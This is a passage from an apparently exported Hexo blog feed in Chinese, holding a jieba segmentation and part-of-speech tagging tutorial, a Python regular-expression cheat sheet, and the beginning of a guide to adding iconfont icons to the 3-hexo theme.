<h3 id="直接使用jieba-cut"><a href="#直接使用jieba-cut" class="headerlink" title="直接使用jieba.cut"></a>直接使用jieba.cut</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: yudengwu(余登武）</span></span><br><span class="line"><span class="comment"># @Date  : 2020/9/10</span></span><br><span class="line"><span class="comment">#@email:1344732766@qq.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line">sentence=<span class="string">&quot;《乘风破浪的姐姐》现在已经播出到了第2期节目，在初舞台之后，现在大家都对姐姐们的实力是有所了解的了。&quot;</span></span><br><span class="line">c=jieba.cut(sentence)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">d=[i <span class="keyword">for</span> i <span class="keyword">in</span> c]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p>直接使用jieba.cut()返回的是一个对象。<br>我们更多需要用一个迭代器是结果显示出来。[i for i in c]</p>
<p><img src="./img/20200910134407321.png" class="lazyload" data-srcset="./img/20200910134407321.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200910134407321"></p>
<h3 id="全模式分词"><a href="#全模式分词" class="headerlink" title="全模式分词"></a><strong>全模式分词</strong></h3><p>如输入北京大学</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jieba.cut(sentence,cut_all=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><img src="./img/20200910134817806.png" class="lazyload" data-srcset="./img/20200910134817806.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200910134817806"></p>
<h3 id="搜索引擎分词"><a href="#搜索引擎分词" class="headerlink" title="搜索引擎分词"></a><strong>搜索引擎分词</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=jieba.cut_for_search(sentence)</span><br></pre></td></tr></table></figure>

<p><img src="./img/20200910135055616.png" class="lazyload" data-srcset="./img/20200910135055616.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200910135055616"></p>
<h3 id="使用jieba-lcut分词"><a href="#使用jieba-lcut分词" class="headerlink" title="使用jieba.lcut分词"></a><strong>使用jieba.lcut分词</strong></h3><p>jieba.lcut()也可以使用全模式搜索，添加参数cut_all=True</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line">sentence=<span class="string">&quot;《乘风破浪的姐姐》现在已经播出到了第2期节目，在初舞台之后，现在大家都对姐姐们的实力是有所了解的了。&quot;</span></span><br><span class="line">c=jieba.lcut(sentence)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>

<p>分词结果是一个数组，非对象。</p>
<p><img src="./img/20200910135314260.png" class="lazyload" data-srcset="./img/20200910135314260.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200910135314260"></p>
<h2 id="修改词典"><a href="#修改词典" class="headerlink" title="修改词典"></a>修改词典</h2><p>在现实生活中，有时候我们希望一个词不被分开，可以修改jieba的词典。<br>add_word(word, freq=None, tag=None) 和 del_word(word) #动态修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">jieba.add_word(<span class="string">&#x27;乘风破浪的姐姐&#x27;</span>,freq = <span class="number">20000</span>, tag = <span class="literal">None</span>)</span><br><span class="line">sentence=<span class="string">&quot;《乘风破浪的姐姐》现在已经播出到了第2期节目，在初舞台之后，现在大家都对姐姐们的实力是有所了解的了。&quot;</span></span><br><span class="line">c=jieba.lcut(sentence)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>

<p><img src="./img/2020091014031335.png" class="lazyload" data-srcset="./img/2020091014031335.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2020091014031335"></p>
<h2 id="统计词频"><a href="#统计词频" class="headerlink" title="统计词频"></a>统计词频</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">sentence=<span class="string">&quot;《乘风破浪的姐姐》现在已经播出到了第2期节目，在初舞台之后，现在大家都对姐姐们的实力是有所了解的了。&quot;</span></span><br><span class="line">words = jieba.lcut(sentence)     <span class="comment"># 使用精确模式对文本进行分词</span></span><br><span class="line">counts = &#123;&#125;     <span class="comment"># 通过键值对的形式存储词语及其出现的次数</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(word) == <span class="number">1</span>:    <span class="comment"># 单个词语不计算在内</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        counts[word] = counts.get(word, <span class="number">0</span>) + <span class="number">1</span>    <span class="comment"># 遍历所有词语，每出现一次其对应的值加 1</span></span><br><span class="line">items = <span class="built_in">list</span>(counts.items())</span><br><span class="line"><span class="built_in">print</span>(items)</span><br><span class="line">items.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)    <span class="comment"># 根据词语出现的次数进行从大到小排序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    word, count = items[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125;:&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(word, count))</span><br></pre></td></tr></table></figure>

<p><img src="./img/20200910140829250.png" class="lazyload" data-srcset="./img/20200910140829250.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200910140829250"></p>
<h4 id="使用CountVectorizer统计词频"><a href="#使用CountVectorizer统计词频" class="headerlink" title="使用CountVectorizer统计词频"></a><strong>使用CountVectorizer统计词频</strong></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">sentence=<span class="string">&quot;《乘风破浪的姐姐》现在已经播出到了第2期节目，在初舞台之后，现在大家都对姐姐们的实力是有所了解的了。&quot;</span></span><br><span class="line">words = jieba.lcut(sentence)     <span class="comment"># 使用精确模式对文本进行分词</span></span><br><span class="line"><span class="keyword">from</span> sklearn.feature_extraction.text <span class="keyword">import</span> CountVectorizer</span><br><span class="line">cv = CountVectorizer()<span class="comment">#创建词袋数据结构</span></span><br><span class="line">cv_fit=cv.fit_transform(words)</span><br><span class="line"><span class="comment">#上述代码等价于下面两行</span></span><br><span class="line"><span class="comment">#cv.fit(texts)</span></span><br><span class="line"><span class="comment">#cv_fit=cv.transform(texts)</span></span><br><span class="line"><span class="built_in">print</span>(cv.get_feature_names())    <span class="comment">#列表形式呈现文章生成的词典</span></span><br><span class="line"><span class="comment">#[&#x27;之后&#x27;, &#x27;乘风破浪&#x27;, &#x27;了解&#x27;, &#x27;大家&#x27;, &#x27;姐姐&#x27;, &#x27;实力&#x27;, &#x27;已经&#x27;, &#x27;播出&#x27;, &#x27;有所&#x27;, &#x27;现在&#x27;, &#x27;舞台&#x27;, &#x27;节目&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(cv.vocabulary_	)<span class="comment">#&#123;词：词频&#125;</span></span><br><span class="line"><span class="comment">#&#123;&#x27;乘风破浪&#x27;: 1, &#x27;姐姐&#x27;: 4, &#x27;现在&#x27;: 9, &#x27;已经&#x27;: 6, &#x27;播出&#x27;: 7, &#x27;节目&#x27;: 11, &#x27;舞台&#x27;: 10, &#x27;之后&#x27;: 0, &#x27;大家&#x27;: 3, &#x27;实力&#x27;: 5, &#x27;有所&#x27;: 8, &#x27;了解&#x27;: 2&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="词性标注"><a href="#词性标注" class="headerlink" title="词性标注"></a>词性标注</h2><p>jieba分词的词性标注过程非常类似于jieba分词的分词流程，同时进行分词和词性标注。</p>
<p>在词性标注的时候，首先基于正则表达式（汉字）进行判断，1）如果是汉字，则会基于前缀词典构建有向无环图，然后基于有向图计算最大概率路径，同时在前缀词典中查找所分出的词的词性，如果没有找到，则将其词性标注为“x”（非语素字 非语素字只是一个符号，字母x通常用于代表未知数、符号）；如果HMM标志位置位，并且该词为未登录词，则通过隐马尔科夫模型对其进行词性标注；2）如果是其它，则根据正则表达式判断其类型，分别赋予“x”，“m”（数词 取英语numeral的第3个字母，n，u已有他用），“eng”（英文）。流程图如下所示。</p>
<p>大白话讲解就是：先根据分词结果查找词典词性，给大多数词打上词性，未打上词性的单词再根据HMM模型打上词性。</p>
<p><img src="./img/20200910142808917.png" class="lazyload" data-srcset="./img/20200910142808917.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200910142808917"></p>
<h3 id="jieba词性表，概括了绝大部分"><a href="#jieba词性表，概括了绝大部分" class="headerlink" title="jieba词性表，概括了绝大部分"></a><strong>jieba词性表，概括了绝大部分</strong></h3><table>
<thead>
<tr>
<th>英文简写</th>
<th>中文</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>a</td>
<td>形容词</td>
<td>很贵 挺好用</td>
</tr>
<tr>
<td>ad</td>
<td>副形词</td>
<td>努目 完全</td>
</tr>
<tr>
<td>ag</td>
<td>形语素</td>
<td>详 笃 睦</td>
</tr>
<tr>
<td>an</td>
<td>名形词</td>
<td>困苦 危难</td>
</tr>
<tr>
<td>b</td>
<td>区别词</td>
<td>超常规 同一性</td>
</tr>
<tr>
<td>c</td>
<td>连词</td>
<td>以外 换句话</td>
</tr>
<tr>
<td>d</td>
<td>副词</td>
<td>幸免 四顾 绝对</td>
</tr>
<tr>
<td>dg</td>
<td>副语素</td>
<td>俱 辄</td>
</tr>
<tr>
<td>e</td>
<td>叹词</td>
<td>好哟 嗄</td>
</tr>
<tr>
<td>f</td>
<td>方位词</td>
<td>内侧 以来</td>
</tr>
<tr>
<td>h</td>
<td>前接成分</td>
<td>非 超低</td>
</tr>
<tr>
<td>i</td>
<td>成语</td>
<td></td>
</tr>
<tr>
<td>j</td>
<td>简称略语</td>
<td>交警 中低收入 四个现代</td>
</tr>
<tr>
<td>k</td>
<td>后接成分</td>
<td>型 者 式 们</td>
</tr>
<tr>
<td>l</td>
<td>习用语</td>
<td>由下而上 十字路口</td>
</tr>
<tr>
<td>m</td>
<td>数词</td>
<td>九六 十二</td>
</tr>
<tr>
<td>mg</td>
<td>数语素</td>
<td>寅 巳</td>
</tr>
<tr>
<td>mq</td>
<td>数量词</td>
<td>半年度 四方面</td>
</tr>
<tr>
<td>n</td>
<td>名词</td>
<td>气压 写实性</td>
</tr>
<tr>
<td>ng</td>
<td>名语素</td>
<td>诀 卉 茗 鹊 娃 寨 酊 钬</td>
</tr>
<tr>
<td>nr</td>
<td>人名</td>
<td></td>
</tr>
<tr>
<td>nrt</td>
<td>音译人名</td>
<td>米尔科 达尼丁</td>
</tr>
<tr>
<td>nrfg</td>
<td>古近代人名</td>
<td>张飞 赵云 任弼时</td>
</tr>
<tr>
<td>ns</td>
<td>地名</td>
<td></td>
</tr>
<tr>
<td>nt</td>
<td>机构团体</td>
<td>浙江队 中医院 中华网 铁道部</td>
</tr>
<tr>
<td>nz</td>
<td>其他专名</td>
<td>培根 补丁 圣战士 英属 国药准字</td>
</tr>
<tr>
<td>o</td>
<td>拟声词</td>
<td>哈喇 咝 哗喇 咔喳 飕 哇哇</td>
</tr>
<tr>
<td>p</td>
<td>介词</td>
<td>顺当 顺着 借了 连着</td>
</tr>
<tr>
<td>q</td>
<td>量词</td>
<td>毫厘 盅 封 千瓦小时</td>
</tr>
<tr>
<td>r</td>
<td>代词</td>
<td>该车 这时 那些</td>
</tr>
<tr>
<td>rg</td>
<td>代语素</td>
<td>兹</td>
</tr>
<tr>
<td>t</td>
<td>时间词</td>
<td>新一代 清时 先上去 月初 昔年 无日</td>
</tr>
<tr>
<td>tg</td>
<td>时间语素</td>
<td>昔 晚 春 现 暮 夕 宵</td>
</tr>
<tr>
<td>u</td>
<td>助词</td>
<td>则否 等 恁地 等等 似的 来说 矣哉 来看 般 的话</td>
</tr>
<tr>
<td>v</td>
<td>动词</td>
<td></td>
</tr>
<tr>
<td>vd</td>
<td>副动词</td>
<td></td>
</tr>
<tr>
<td>y</td>
<td>语气词</td>
<td></td>
</tr>
<tr>
<td>z</td>
<td>状态词</td>
<td></td>
</tr>
</tbody></table>
<h3 id="如何查看jieba的所有词性，见代码"><a href="#如何查看jieba的所有词性，见代码" class="headerlink" title="如何查看jieba的所有词性，见代码"></a>如何查看jieba的所有词性，见代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba, pandas <span class="keyword">as</span> pd, os</span><br><span class="line">jieba_dict = os.path.dirname(jieba.__file__) + <span class="string">&#x27;/dict.txt&#x27;</span></span><br><span class="line">df_jieba = pd.read_table(jieba_dict, sep=<span class="string">&#x27; &#x27;</span>, header=<span class="literal">None</span>)[[<span class="number">2</span>, <span class="number">0</span>]]</span><br><span class="line">dt = &#123;k: <span class="built_in">set</span>() <span class="keyword">for</span> k <span class="keyword">in</span> df_jieba[<span class="number">2</span>].values&#125;</span><br><span class="line"><span class="keyword">for</span> f, w <span class="keyword">in</span> df_jieba.values:dt[f].add(w)</span><br><span class="line">ls_of_ls = [(f, <span class="built_in">len</span>(w), <span class="string">&#x27; &#x27;</span>.join(<span class="built_in">list</span>(w)[:<span class="number">50</span>])) <span class="keyword">for</span> f, w <span class="keyword">in</span> dt.items()]</span><br><span class="line">pd.DataFrame(ls_of_ls, columns=[<span class="string">&#x27;词性&#x27;</span>, <span class="string">&#x27;数量&#x27;</span>, <span class="string">&#x27;例子.&#x27;</span>]).sort_values(<span class="string">&#x27;词性&#x27;</span>).to_csv(<span class="string">&#x27;flag.csv&#x27;</span>, index=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<p>生成的表格</p>
<p><img src="./img/20200910150654203.png" class="lazyload" data-srcset="./img/20200910150654203.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200910150654203"></p>
<p>词性我们一般关注 时间，地名，机构名。用于做命名实体识别。<br>命名实体识别：一般是词性标注加正则。<br>我是一个学电气的，我怎么懂得这些人工智能方面的知识。</p>
<h3 id="词性标注-1"><a href="#词性标注-1" class="headerlink" title="词性标注"></a><strong>词性标注</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba.posseg <span class="keyword">as</span> pseg</span><br><span class="line">words =pseg.cut(<span class="string">&quot;我爱北京天安门,我希望我以后的儿子能去清华大学读书&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words:</span><br><span class="line">    <span class="built_in">print</span>(w.word,w.flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="./img/20200910152422487.png" class="lazyload" data-srcset="./img/20200910152422487.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20200910152422487"></p>
<p>词性标注 如果我们只想获得机构名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba.posseg <span class="keyword">as</span> pseg</span><br><span class="line">words =pseg.cut(<span class="string">&quot;我爱北京天安门,我希望我以后的儿子能去清华大学读书&quot;</span>)</span><br><span class="line"></span><br><span class="line">c=[w.word <span class="keyword">for</span> w <span class="keyword">in</span> words <span class="keyword">if</span> w.flag==<span class="string">&#x27;nt&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>

<p><img src="./img/2020091015281243.png" class="lazyload" data-srcset="./img/2020091015281243.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2020091015281243"></p>
]]></content>
      <categories>
        <category>模块</category>
      </categories>
      <tags>
        <tag>jieba</tag>
      </tags>
  </entry>
  <entry>
    <title>re库</title>
    <url>//re%E5%BA%93</url>
    <content><![CDATA[<h1 id="re库"><a href="#re库" class="headerlink" title="re库"></a>re库</h1><p>即正则表达式 </p>
<p>主要⽤re.search(expression,text) </p>
<h2 id="1-字符"><a href="#1-字符" class="headerlink" title="1.字符"></a>1.字符</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \d == [0-9]，数字或空字符串</span></span><br><span class="line"><span class="comment"># \D == [^0-9]</span></span><br><span class="line"><span class="comment"># \w == [a-zA-Z0-9_]，1个字符或_，可以匹配汉字，不匹配标点</span></span><br><span class="line"><span class="comment"># \W == [^a-zA-Z0-9_]</span></span><br><span class="line"><span class="comment"># \s 空白，即空格，tab</span></span><br><span class="line"><span class="comment"># \S 非空白</span></span><br><span class="line"><span class="comment"># . 任意一个字符，除了\n</span></span><br><span class="line"><span class="comment"># [] 列举的任意1个字符</span></span><br><span class="line"><span class="comment"># [^] 反列举任意一个字符，注意[^]也会占一个位置</span></span><br></pre></td></tr></table></figure>

<h2 id="2-数量符"><a href="#2-数量符" class="headerlink" title="2.数量符"></a>2.数量符</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可与\d,\w等一起用，出现表示包括自己共有</span></span><br><span class="line"><span class="comment"># * 前一个字符出现0次或多次</span></span><br><span class="line"><span class="comment"># + 前一个字符出现1次或多次</span></span><br><span class="line"><span class="comment"># ? 前一个字符出现0或1次</span></span><br><span class="line"><span class="comment"># &#123;m&#125; 前一个字符出现m次</span></span><br><span class="line"><span class="comment"># &#123;m.&#125; 前一个字符至少出现m次</span></span><br><span class="line"><span class="comment"># &#123;m,n&#125; 前一个字符出现m到n次</span></span><br></pre></td></tr></table></figure>

<h2 id="3-边界符"><a href="#3-边界符" class="headerlink" title="3.边界符"></a>3.边界符</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ^ 表示匹配字符串开头，放到最前面，注意与[^]反列举的区别。在match中，因为match是从左</span></span><br><span class="line"><span class="comment"># $ 匹配字符串结尾，放到最末尾</span></span><br><span class="line"><span class="comment"># \b 匹配一个单词的边界，即空格，标点或一行的顶头，注意只表示在边界，匹配时正则里还要写</span></span><br><span class="line"><span class="comment"># \B 匹配非单词边界</span></span><br></pre></td></tr></table></figure>

<h2 id="4-匹配分组"><a href="#4-匹配分组" class="headerlink" title="4.匹配分组"></a>4.匹配分组</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># | 表达或的关系，匹配 | 左右任意一个表达式或 exp0(exp1|exp2|exp3)exp4，匹配括号内</span></span><br><span class="line"><span class="comment"># (ab) 将括号中字符作为一个分组,从字符串中提取特定部分</span></span><br><span class="line"><span class="comment"># \n 引用第n个分组所匹配到的字符串</span></span><br><span class="line"><span class="comment"># (?P&lt;name&gt;) 分组起别名，防止括号过多出错，正则表达式写到&lt;&gt;后，引用时用(?P=name)</span></span><br><span class="line"><span class="comment"># (?P=name) 引用别名为name的分组匹配到的字符串</span></span><br></pre></td></tr></table></figure>

<h2 id="5-贪婪模式"><a href="#5-贪婪模式" class="headerlink" title="5.贪婪模式"></a>5.贪婪模式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 所有语言的正则表达式的 * + ? &#123;m,n&#125; 都默认贪婪模式</span></span><br><span class="line"><span class="comment"># s = &quot;&lt;p&gt;大数据，数理统计，sklearn，高性能。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"># &lt;p&gt;推荐算法、数据统计、接口&lt;/p&gt;</span></span><br><span class="line"><span class="comment"># &lt;p&gt;1、后台服务器，一年以上python开发经验&lt;/p&gt;</span></span><br><span class="line"><span class="comment"># &lt;p&gt;2、掌握http协议、熟悉MVC、MVM等命令&lt;/p&gt;</span></span><br><span class="line"><span class="comment"># &quot;</span></span><br><span class="line"><span class="comment"># print(re.sub(r&quot;&lt;.+&gt;&quot;, &quot;&quot;, s))#用.+表示尖括号里所有内容，输出内容会只剩下\n\n\n</span></span><br><span class="line"><span class="comment"># print(re.sub(r&quot;&lt;\w+&gt;&quot;, &quot;&quot;, s))</span></span><br><span class="line"><span class="comment">#贪婪就是只要能符合规则，就尽可能多的匹配，可以是.的都先认为是.</span></span><br><span class="line"><span class="comment">#匹配到 &lt; 时开始，找到 &gt; 时并不停止，而认为是 . 直到找到一行的最后一个非 . 内容\n</span></span><br><span class="line"><span class="comment">#而\n前又恰好是 &gt; ，所以它默认最后一个 &gt; 是 &gt; ，前面的 &gt; 是 .</span></span><br><span class="line"><span class="comment"># 在* ? + &#123;m,n&#125;后面加上 ? 可以关闭贪婪模式，表示要求数量符匹配到的越少越好</span></span><br><span class="line"><span class="comment"># s = &quot;This is a number 234-235-423&quot;</span></span><br><span class="line"><span class="comment"># print(re.match(r&quot;(.+)(\d+-\d+-\d+)&quot;, s).groups()) #在贪婪模式下，会把23匹配到</span></span><br><span class="line"><span class="comment"># print(re.match(r&quot;(.+?)(\d+-\d+-\d+)&quot;, s).groups())</span></span><br></pre></td></tr></table></figure>

























]]></content>
      <categories>
        <category>模块</category>
      </categories>
      <tags>
        <tag>jieba</tag>
      </tags>
  </entry>
  <entry>
    <title>3-hexo添加自定义图标</title>
    <url>//3-hexo-add-icon</url>
    <content><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>鉴于许多人问过如何添加自定义图标，这里就详细说明一下，以备后人乘凉。</p>
<p>这篇文章主要讲解是从 <a href="https://www.iconfont.cn/">iconfont</a> 添加图标。</p>
<h2 id="二、添加彩色图标"><a href="#二、添加彩色图标" class="headerlink" title="二、添加彩色图标"></a>二、添加彩色图标</h2><h3 id="2-1-登录并添加图标"><a href="#2-1-登录并添加图标" class="headerlink" title="2.1 登录并添加图标"></a>2.1 登录并添加图标</h3><p>访问 <a href="https://www.iconfont.cn/">iconfont</a>，点击如下图位置登录，可以使用 <code>Github</code> 账号登录。</p>
<p><img src="https://img.saodiyang.com/picgo_qiniu20201228230707.png" class="lazyload" data-srcset="https://img.saodiyang.com/picgo_qiniu20201228230707.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="iconfont 登录"></p>
<p>登录成功后，搜索合适的图标，然后点击添加到购物车，如下图所示。</p>
<p><img src="https://img.saodiyang.com/picgo_qiniu20201228231118.png" class="lazyload" data-srcset="https://img.saodiyang.com/picgo_qiniu20201228231118.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>添加了多个后，可以点击右上角的“购物车”，添加到项目，点击加号创建项目，如下图所示。</p>
<p><img src="https://img.saodiyang.com/picgo_qiniu20201228231558.png" class="lazyload" data-srcset="https://img.saodiyang.com/picgo_qiniu20201228231558.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>添加完成后回到项目页面，找到自己刚刚创建的项目。</p>
<blockquote>
<p>如果没有到项目页面，可以点击上面菜单进入：资源管理 -&gt; 我的项目</p>
</blockquote>
<h3 id="2-2-引入-3-hexo-中"><a href="#2-2-引入-3-hexo-中" class="headerlink" title="2.2 引入 3-hexo 中"></a>2.2 引入 3-hexo 中</h3><p>点击下载到本地，解压并复制其中的 <code>iconfont.js</code> 到项目 <code>3-hexo/source/js/</code> 下，并改名 <code>custom-iconfont.js</code>。</p>
<p><img src="https://img.saodiyang.com/picgo_qiniu20201229003210.png" class="lazyload" data-srcset="https://img.saodiyang.com/picgo_qiniu20201229003210.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
<p>在文件 <code>3-hexo/layout/_partial/meta.ejs</code> 最后追加下面一行。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&lt;%=theme.blog_path?theme.blog_path.lastIndexOf(&quot;</span>/&quot;) === <span class="string">theme.blog_path.length-1?theme.blog_path.slice(0,</span> <span class="attr">theme.blog_path.length-1</span>)<span class="attr">:theme.blog_path:</span>&#x27;&#x27; %&gt;</span>/js/custom-iconfont.js?v=&lt;%=theme.version%&gt;&quot; &gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-在配置文件中添加生效"><a href="#2-3-在配置文件中添加生效" class="headerlink" title="2.3 在配置文件中添加生效"></a>2.3 在配置文件中添加生效</h3><p>修改 <code>3-hexo/_config.yml</code> 如下图所示</p>
